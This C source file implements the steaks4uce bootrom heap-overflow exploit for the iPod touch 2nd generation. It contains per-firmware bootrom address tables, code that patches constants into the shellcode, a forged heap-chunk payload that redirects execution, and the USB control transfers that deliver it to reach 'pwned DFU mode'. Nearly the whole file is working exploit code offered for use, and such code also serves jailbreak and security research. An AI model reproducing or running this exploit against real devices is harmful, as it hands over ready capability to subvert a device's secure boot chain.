#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <assert.h>

#include "steaks4uce.h"
#include <libirecovery.h>

#define NUM_CONSTANTS 26

const uint32_t constants_240_4[] = {
    0x22030000, //  1 - MAIN_STACK_ADDRESS
        0x3af5, //  2 - nor_power_on
        0x486d, //  3 - nor_init
        0x6c81, //  4 - usb_destroy
        0x1059, //  5 - usb_shutdown
         0x560, //  6 - invalidate_instruction_cache
    0x2202d800, //  7 - RELOCATE_SHELLCODE_ADDRESS
         0x200, //  8 - RELOCATE_SHELLCODE_SIZE
        0x795c, //  9 - memmove
         0x534, // 10 - clean_data_cache
         0x280, // 11 - gVersionString
        0x83cd, // 12 - strlcat
        0x30e9, // 13 - usb_wait_for_image
    0x22000000, // 14 - LOAD_ADDRESS
       0x24000, // 15 - MAX_SIZE
    0x220241ac, // 16 - gLeakingDFUBuffer
        0x1955, // 17 - free
    0x65786563, // 18 - EXEC_MAGIC
        0x1bf1, // 19 - memz_create
        0x3339, // 20 - jump_to
        0x1c19, // 21 - memz_destroy
          0x58, // 22 - IMAGE3_LOAD_SP_OFFSET
          0x54, // 23 - IMAGE3_LOAD_STRUCT_OFFSET
        0x1c5d, // 24 - image3_create_struct
        0x22cd, // 25 - image3_load_continue
        0x23a3  // 26 - image3_load_fail
};

const uint32_t constants_240_5_1[] = {
    0x22030000, //  1 - MAIN_STACK_ADDRESS
        0x3afd, //  2 - nor_power_on
        0x4875, //  3 - nor_init
        0x6c89, //  4 - usb_destroy
        0x1059, //  5 - usb_shutdown
         0x560, //  6 - invalidate_instruction_cache
    0x2202d800, //  7 - RELOCATE_SHELLCODE_ADDRESS
         0x200, //  8 - RELOCATE_SHELLCODE_SIZE
        0x7964, //  9 - memmove
         0x534, // 10 - clean_data_cache
         0x280, // 11 - gVersionString
        0x83d5, // 12 - strlcat
        0x30f1, // 13 - usb_wait_for_image
    0x22000000, // 14 - LOAD_ADDRESS
       0x24000, // 15 - MAX_SIZE
    0x220241ac, // 16 - gLeakingDFUBuffer
        0x1955, // 17 - free
    0x65786563, // 18 - EXEC_MAGIC
        0x1bf9, // 19 - memz_create
        0x3341, // 20 - jump_to
        0x1c21, // 21 - memz_destroy
          0x58, // 22 - IMAGE3_LOAD_SP_OFFSET
          0x54, // 23 - IMAGE3_LOAD_STRUCT_OFFSET
        0x1c65, // 24 - image3_create_struct
        0x22d5, // 25 - image3_load_continue
        0x23ab  // 26 - image3_load_fail
};

int prepare_shellcode(const char* srtg) {
    const uint32_t *constants = NULL;
    if (strstr(srtg, "240.4"))
        constants = constants_240_4;
    else
        constants = constants_240_5_1;

    size_t const_offset = steaks4uce_shellcode_len - 4 * NUM_CONSTANTS;

    for (int i = 0; i < NUM_CONSTANTS; i++) {
        uint32_t *ptr = (uint32_t*)(steaks4uce_shellcode + const_offset + 4 * i);
        assert(*ptr == (0xBAD00001 + i));
        *ptr = constants[i];
    }

    return 0;
}

unsigned char payload[0x138] = {0};

int main() {
    irecv_error_t error = IRECV_E_SUCCESS;
    int ret;

    uint32_t data[] = {
        0x84,           // 0x00: previous_chunk
        0x05,           // 0x04: next_chunk
        0x80,           // 0x08: buffer[0] - direction
        0x22026280,     // 0x0c: buffer[1] - usb_response_buffer
        0xFFFFFFFF,     // 0x10: buffer[2]
        0x138,          // 0x14: buffer[3] - size of payload in bytes
        0x100,          // 0x18: buffer[4]
        0x0,            // 0x1c: buffer[5]
        0x0,            // 0x20: buffer[6]
        0x0,            // 0x24: unused
        0x15,           // 0x28: previous_chunk (fake free chunk)
        0x2,            // 0x2c: next_chunk
        0x22000001,     // 0x30: fd - shellcode_address
        0x2202D7FC      // 0x34: bk - LR on the stack
    };
    memcpy(payload + 0x100, data, sizeof(data));

    printf("*** based on steaks4uce exploit (heap overflow) by pod2g ***\n");

    irecv_client_t client = NULL;
    irecv_error_t err = irecv_open_with_ecid(&client, 0);
    if (err != IRECV_E_SUCCESS) {
        fprintf(stderr, "ERROR: %s\n", irecv_strerror(err));
        return -1;
    }

    const struct irecv_device_info *devinfo = irecv_get_device_info(client);
    if (devinfo->cpid != 0x8720) {
        printf("ERROR: Device is not an iPod touch 2nd generation.\n");
        return -1;
    }
    char* p = strstr(devinfo->serial_string, "PWND:[");
    if (p) {
        printf("Device is already in pwned DFU mode.\n");
        return 0;
    }

    prepare_shellcode(devinfo->srtg);

    printf("Resetting USB counters.\n");
    ret = irecv_reset_counters(client);
    if (ret < 0) {
        printf("ERROR: Failed to reset USB counters.\n");
        return -1;
    }

    printf("Uploading patched shellcode for %s: %#x of data\n", devinfo->srtg, steaks4uce_shellcode_len);
    ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, steaks4uce_shellcode, steaks4uce_shellcode_len, 5000);
    if (ret < 0) {
        printf("ERROR: Failed to send steaks4uce to the device.\n");
        return -1;
    }

    printf("Uploading payload: %#zx of data\n", sizeof(payload));
    ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, payload, sizeof(payload), 5000);
    if (ret < 0) {
        printf("ERROR: Failed to upload payload.\n");
        return -1;
    }
    ret = irecv_usb_control_transfer(client, 0xA1, 1, 0, 0, payload, sizeof(payload), 1000);
    if (ret != sizeof(payload)) {
        printf("ERROR: Failed to execute steaks4uce.\n");
        return -1;
    }

    printf("Releasing device handle.\n");
    irecv_close(client);

    printf("Acquiring device handle.\n");
    err = irecv_open_with_ecid(&client, 0);

    printf("Reconnecting to device.\n");
    client = irecv_reconnect(client, 2);
    if (client == NULL) {
        printf("ERROR: Unable to reconnect to device.\n");
        return -1;
    }

    devinfo = irecv_get_device_info(client);
    p = strstr(devinfo->serial_string, "PWND:[");
    if (!p) {
        printf("ERROR: Exploit failed. Device did not enter pwned DFU mode.\n");
        return -1;
    }

    printf("Releasing device handle.\n");
    irecv_close(client);

    printf("Device is now in pwned DFU mode.\n");
    return 0;
}
